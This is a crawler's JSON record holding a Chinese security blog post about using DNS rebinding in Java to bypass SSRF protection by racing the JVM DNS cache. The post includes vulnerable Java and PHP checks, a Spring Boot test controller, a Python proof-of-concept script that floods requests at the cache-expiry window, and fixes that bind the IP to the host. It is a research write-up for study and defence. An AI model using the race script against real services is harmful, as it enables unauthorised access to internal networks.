{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-10 00:43:20","updatedTime":"2020-10-10 00:43:20","title":"Java环境下通过时间竞争实现DNS Rebinding 绕过SSRF 防御限制","link":"https://www.xmanblog.net/?p=9095","description":"<h1>零、前言</h1>\n<p>一个Java环境下SSRF新型利用方式。</p>\n<p>本文已首发『<a href=\"https://mp.weixin.qq.com/s/dA40CUinwaitZDx6X89TKw\">百度安全应急响应中心</a>』公众号，禁止转载。</p>\n<h1>一、  漏洞原理</h1>\n<p>SSRF(Server-Side Request Forgery，服务器端请求伪造)漏洞，主要指攻击者利用可发起网络请求的服务当做跳板攻击其他服务的安全漏洞（在请求远程服务端资源前，未检查是否为内网资源，直接请求的行为，不管是否返回了请求结果信息，只要发起了请求，均存在SSRF问题）。常见情况下，SSRF攻击的目标是从外网无法直接访问的内部系统。</p>\n<p>SSRF 攻击的常规检查一般有以下几个步骤：</p>\n<ul>\n<li>解析URL的协议和IP</li>\n<li>检查协议，一般只允许HTTP或HTTPS，避免file、gopher等协议的风险</li>\n<li>检查IP，看请求地址是否是内网IP</li>\n<li>检查重定向，直接禁止或者递归检查</li>\n<li>若不存在风险，则业务发起URL请求</li>\n</ul>\n<p>示例代码如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\">public static String checkSSRF(String url) {\n\n    HttpURLConnection connection;\n\n    try {\n        // 检查协议\n        URL u = new URL(url);\n        if (!u.getProtocol().startsWith(\"http\") &#38;&#38; !u.getProtocol().startsWith(\"https\")) {\n            return \"Protocol ERROR\";\n        }\n\n        // 检查ip\n        String host = url.getHost();\n        InetAddress ip = InetAddress.getByName(host)\n        if(isPrivateIp(ip)){\n            return \"IP ERROR\";\n        }\n\n        // 业务请求\n        connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setInstanceFollowRedirects(false);\n        connection.setUseCaches(false); // 设置为false，手动处理跳转，可以拿到每个跳转的URL\n        connection.setConnectTimeout(3*1000); // 设置连接超时时间为3s\n        connection.connect(); // send dns request\n    } catch (Exception e) {\n        return true;\n    }\n    return true;\n}</pre>\n<h1>二、  DNS Rebinding</h1>\n<p>上述的修复方案乍一看没有什么不妥，但是从DNS解析的角度看上述的流程一共发生了两次DNS解析，第一次是检查IP，第二次是正常的业务请求。</p>\n<p>那么两次DNS之间存在一个时间差，在协议正确的情况下，如果设置两个DNS记录，第一个为外网地址，第二个为内网地址，按顺序解析且TTL为0。攻击检测时，解析第一个外网地址，通过检查；在业务请求时，解析第二个内网地址，则可以实现SSRF攻击。DNS设置如下图所示（DNS服务构建可参考：https://github.com/makuga01/dnsFookup）</p>\n<p><img class=\"alignnone size-full wp-image-9096\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-1.png\" alt=\"\" width=\"864\" height=\"197\" /></p>\n<p>使用dig进行DNS解析，先后两次结果为</p>\n<p><img class=\"alignnone size-full wp-image-9097\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-2.png\" alt=\"\" width=\"864\" height=\"75\" /></p>\n<p><img class=\"alignnone size-full wp-image-9098\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-3.png\" alt=\"\" width=\"864\" height=\"70\" /></p>\n<p>我们以如下PHP代码为例，该代码将取出来的 $ip 通过了内网IP检测后，进入curl流程会重新执行一次域名解析。如果此刻域名的解析突然变为内网，则curl会跟进内网的访问，从而实现了SSRF的绕过。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">&#60;?php\n    $host = parse_url($url, PHP_URL_HOST);\n    $ip = @gethostbyname($host);\n    if (!isPrivateIp($ip)){\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n..........\n?&#62;</pre>\n<p>因此为了解决通过DNS Rebinding绕过传统修复方案的问题，加入了一个新的步骤：在检测阶段将获取的IP与HOST绑定，后续的业务请求不在重新进行DNS解析，这样保证检测和业务请求的实际IP是一致的。修复示例代码如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">&#60;?php\n    $ip = @gethostbyname($host);\n    $ch = curl_init($scheme.\"://\". $ip. \":\" . $port. $path. $query); // 重新拼接url，将url 用IP进行替换\n    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: '.$host)); // 手动构造Header头 Host字段，实现绑定\n    $response = curl_exec($ch);\n    curl_close($ch);\n?&#62;</pre>\n<p>Java程序一般被认为并不存在DNS Rebinding的问题，因为Java JVM 存在DNS缓存机制，短时间内的请求会从直接从缓存获取解析记录，而不是二次发起DNS请求。所以在修复的时候，Java可能不会考虑将IP与HOST绑定，不过笔者发现Java环境下可以通过时间竞争实现DNS Rebinding，绕过DNS缓存对常规DNS Rebinding的限制。</p>\n<h1>三、  Java环境下的特殊利用</h1>\n<p>Java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存10s（字段为networkaddress.cache.negative.ttl，默认为10s）。缓存时间在 /Library/Java/JavaVirtualMachines/jdk /Contents/Home/jre/lib/security/java.security 中配置。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\"># The Java-level namelookup cache policy for successful lookups:\n#\n# any negative value: caching forever\n# any positive value: the number of seconds to cache an address for\n# zero: do not cache\n#\n# default value is forever (FOREVER). For security reasons, this\n# caching is made forever when a security manager is set. When a security\n# manager is not set, the default behavior in this implementation\n# is to cache for 30 seconds.\n#\n# NOTE: setting this to anything other than the default value can have\n#       serious security implications. Do not set it unless\n#       you are sure you are not exposed to DNS spoofing attack.\n#\n#networkaddress.cache.ttl=-1\n\n# The Java-level namelookup cache policy for failed lookups:\n#\n# any negative value: cache forever\n# any positive value: the number of seconds to cache negative lookup results\n# zero: do not cache\n#\n# In some Microsoft Windows networking environments that employ\n# the WINS name service in addition to DNS, name service lookups\n# that fail may take a noticeably long time to return (approx. 5 seconds).\n# For this reason the default caching policy is to maintain these\n# results for 10 seconds.\n#\n#\nnetworkaddress.cache.negative.ttl=10</pre>\n<p>那么思考这样一个问题，如果刚刚好到了DNS缓存时间，此时更新DNS缓存，那些已经过了SSRF Check而又没有正式发起业务请求的request，是否使用的是新的DNS解析结果呢，如下图所示：</p>\n<p><img class=\"alignnone size-full wp-image-9099\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-4.png\" alt=\"\" width=\"864\" height=\"224\" /></p>\n<p>以域名ssrf.test.com 为例，当request_1、request_2、request_3刚通过SSRF Check，此时正好DNS缓存过期，而这三个请求处在中间态还没有真正发出去。此时又来一次ssrf.test.com 的请求，此次DNS解析为内网地址，显然它无法经过Check，但它已经保留在了DNS缓存，对于处在中间态的还未发出去的请求，则会使用缓存中的内网地址，以此达到SSRF的效果。也就是说Java也是存在Rebinding的问题，不过这种利用思路需要将SSRF与时间竞争结合。</p>\n<h1>四、  思路验证</h1>\n<p>我们构造如下实验代码</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\">package com.springboot.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetAddress;\nimport java.net.URL;\nimport javax.servlet.http.HttpServletRequest;\n\n@RestController\npublic class TestController {\n\n    @RequestMapping(\"/test\")\n    public String test(HttpServletRequest request) throws FileNotFoundException {\n\n        String msg = \"\";\n        try{\n            String domain = request.getParameter(\"domain\");\n            URL url = new URL(domain);\n            String host = url.getHost();\n            InetAddress ip = InetAddress.getByName(host);\n            if(isPrivateIp(ip)){\n                System.out.println(\"isPrivateIp\");\n                return \"IP ERROR\";\n            }\n\n            //do something\n            Thread.sleep(500);\n            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();\n            httpURLConnection.connect();\n            int code = httpURLConnection.getResponseCode();\n            if (code == 200) { // 正常响应\n                // 从流中读取响应信息\n                BufferedReader reader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));\n                String line = null;\n                while ((line = reader.readLine()) != null) { // 循环从流中读取\n                    msg += line + \"\\n\";\n                }\n                reader.close(); // 关闭流\n            }\n        }catch (Exception e){\n            System.out.println(\"error\");\n            System.out.println(e.toString());\n\n        }\n        return msg;\n    }\n\n    private boolean isPrivateIp(InetAddress ip) {\n        String ipString = ip.getHostAddress();\n        if (ip.isSiteLocalAddress() || ip.isLoopbackAddress() || ip.isAnyLocalAddress()) {\n            // 判断是否为 10.0.0.0/8，172.16.0.0/12，192.168.0.0/16 || 127.0.0.0/8 || 0.0.0.0\n            return true;\n        }\n        // 判断是否为 100.64.0.0/10\n        if (ipString.startsWith(\"100\")) {\n            int x = Integer.parseInt(ipString.split(\"\\\\.\")[1]);\n            return x &#62;= 64 &#38;&#38; x &#60;= 127;\n        }\n        return false;\n    }\n}</pre>\n<p>DNS 解析规则设置如下，解析1次外网，解析1次内网请求。在第一次DNS请求成功解析的情况下，188的外网IP会被缓存30秒，30秒过后开始解析10的内网IP。被解析的那个请求并不会通过isPrivateIp函数的Check，但在30秒的临界点上，会有少量请求经过Check但还没有发出去，此时Java JVM的缓存却已经改变了，最终中间态的少量请求实际是向10的内网IP发起的。</p>\n<p><img class=\"alignnone size-full wp-image-9100\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-5.png\" alt=\"\" width=\"370\" height=\"239\" /></p>\n<p>启动服务，使用burpsuite发起请求，如下图所示，在30秒多一点请求200多次的时候利用成功（解析内容是我们SSRF靶场）。</p>\n<p><img class=\"alignnone size-full wp-image-9101\" src=\"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-6.png\" alt=\"\" width=\"864\" height=\"720\" /></p>\n<p>其实理论上只要在发起第一次请求后等到30秒之前的时候再请求即可，这样应该可以在更少的请求次数内完成漏洞利用。经过实验（代码如下），最少用20次左右的请求即成功执行，在实战中这与服务的并发数量和代码的处理逻辑有关。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#!/usr/bin/env python3\n\nimport requests\nimport threading\nimport time\n\ncount = 0\n\ndef run():\n    global count\n    count += 1\n    r = requests.get(\"http://127.0.0.1:8080/test?domain=http://ssrf.test.com\")\n    if \"2lir6iNQqki1IDcdxr\" in r.text:\n        print(r.text)\n        print(count)\n    return r.text\n\nif __name__ == '__main__':\n    print(run())\n    time.sleep(26)\n    while(True):\n        t = threading.Thread(target=run)\n        t.start()\n        time.sleep(0.1)</pre>\n<h1>五、  修复</h1>\n<p>按照正常的DNS Rebinding修复逻辑修复即可，在Check时获取IP地址，后面的请求绑定此IP。</p>\n<h1>六、  参考文献</h1>\n<p><a href=\"https://paper.seebug.org/390/\">https://paper.seebug.org/390/</a></p>\n<p><a href=\"http://www.lpnote.com/2018/11/23/java-dns-cache/\">http://www.lpnote.com/2018/11/23/java-dns-cache/</a></p>\n","descriptionType":"html","publishedDate":"Sun, 27 Sep 2020 02:26:42 +0000","feedId":44745,"bgimg":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-1.png","linkMd5":"ee5f91ea6f2144c933871e414eac8f00","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn61@2020_1/2020/10/09/16-43-24-925_3d65499aa18fcc0c.webp","destWidth":864,"destHeight":197,"sourceBytes":27131,"destBytes":8730,"author":"Xman21","articleImgCdnMap":{"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-1.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn61@2020_1/2020/10/09/16-43-24-925_3d65499aa18fcc0c.webp","https://www.xmanblog.net/wp-content/uploads/2020/09/图片-2.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn81@2020_5/2020/10/09/16-43-28-346_e7663ef5a9015e92.webp","https://www.xmanblog.net/wp-content/uploads/2020/09/图片-3.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn66@2020_5/2020/10/09/16-43-28-532_7f5e36b045657b30.webp","https://www.xmanblog.net/wp-content/uploads/2020/09/图片-4.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn67@2020_4/2020/10/09/16-43-27-982_69686259ee9db90f.webp","https://www.xmanblog.net/wp-content/uploads/2020/09/图片-5.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn74@2020_4/2020/10/09/16-43-29-760_e08ea8ca3d7e55ad.webp","https://www.xmanblog.net/wp-content/uploads/2020/09/图片-6.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn78@2020_6/2020/10/09/16-43-38-138_e145f247c6d30e33.webp"},"publishedOrCreatedDate":1602261800500}],"record":{"createdTime":"2020-10-10 00:43:20","updatedTime":"2020-10-10 00:43:20","feedId":44745,"fetchDate":"Fri, 09 Oct 2020 16:43:20 +0000","fetchMs":8269,"handleMs":51,"totalMs":27541,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"7b37e896e03ef23ae487347d9632f8b0","hostName":"us-008*","requestId":"2298d33d2814416fb0b81008c7e54c92_44745","contentType":"application/rss+xml; charset=UTF-8","totalBytes":122662,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":6,"articlesImgsGithubTotal":6,"successGithubMap":{"myreaderx33":1,"myreaderx2":1,"myreaderx12":1,"myreaderx13":1,"myreaderx1":1,"myreaderx5oss":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:35:46","updatedTime":"2020-09-07 05:53:56","id":44745,"name":"Xman21'Blog","url":"https://www.xmanblog.net/feed/","subscriber":71,"website":null,"icon":"https://www.xmanblog.net/wp-content/uploads/2020/03/Blog.jpeg","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx65/cdn32@2020_6/2020/09/06/21-53-40-154_6dee3e2606b5fcfd.jpg","description":"巨侠的博客","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":8730,"tmpBodyImgCdnBytes":113932,"tmpBgImgCdnBytes":0,"extra4":{"start":1602261791699,"total":0,"statList":[{"spend":8753,"msg":"获取xml内容"},{"spend":51,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":13501,"msg":"正文链接上传到cdn"}]},"extra5":6,"extra6":6,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-018.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-030.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-1.png","sourceStatusCode":200,"destWidth":864,"destHeight":197,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn61@2020_1/2020/10/09/16-43-24-925_3d65499aa18fcc0c.webp","sourceBytes":27131,"destBytes":8730,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":5192,"convertSpendMs":48,"createdTime":"2020-10-10 00:43:20","host":"us-014*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00,ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"26.5 KB","destSize":"8.5 KB","compressRate":"32.2%"},{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-4.png","sourceStatusCode":200,"destWidth":864,"destHeight":224,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn67@2020_4/2020/10/09/16-43-27-982_69686259ee9db90f.webp","sourceBytes":31101,"destBytes":10810,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":3014,"convertSpendMs":10,"createdTime":"2020-10-10 00:43:25","host":"europe64*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.4 KB","destSize":"10.6 KB","compressRate":"34.8%"},{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-2.png","sourceStatusCode":200,"destWidth":864,"destHeight":75,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn81@2020_5/2020/10/09/16-43-28-346_e7663ef5a9015e92.webp","sourceBytes":55819,"destBytes":8786,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":3406,"convertSpendMs":19,"createdTime":"2020-10-10 00:43:25","host":"us-018*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"54.5 KB","destSize":"8.6 KB","compressRate":"15.7%"},{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-3.png","sourceStatusCode":200,"destWidth":864,"destHeight":70,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn66@2020_5/2020/10/09/16-43-28-532_7f5e36b045657b30.webp","sourceBytes":51347,"destBytes":8812,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":3561,"convertSpendMs":7,"createdTime":"2020-10-10 00:43:25","host":"europe63*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"50.1 KB","destSize":"8.6 KB","compressRate":"17.2%"},{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-5.png","sourceStatusCode":200,"destWidth":370,"destHeight":239,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn74@2020_4/2020/10/09/16-43-29-760_e08ea8ca3d7e55ad.webp","sourceBytes":38136,"destBytes":6156,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":2809,"convertSpendMs":6,"createdTime":"2020-10-10 00:43:27","host":"us-52*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37.2 KB","destSize":"6 KB","compressRate":"16.1%"},{"code":1,"isDone":false,"source":"https://www.xmanblog.net/wp-content/uploads/2020/09/图片-6.png","sourceStatusCode":200,"destWidth":864,"destHeight":720,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn78@2020_6/2020/10/09/16-43-38-138_e145f247c6d30e33.webp","sourceBytes":294718,"destBytes":79368,"targetWebpQuality":75,"feedId":44745,"totalSpendMs":13463,"convertSpendMs":40,"createdTime":"2020-10-10 00:43:25","host":"us-030*","referer":"https://www.xmanblog.net/?p=9095","linkMd5ListStr":"ee5f91ea6f2144c933871e414eac8f00","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"287.8 KB","destSize":"77.5 KB","compressRate":"26.9%"}],"successGithubMap":{"myreaderx33":1,"myreaderx2":1,"myreaderx12":1,"myreaderx13":1,"myreaderx1":1,"myreaderx5oss":1},"failGithubMap":{}}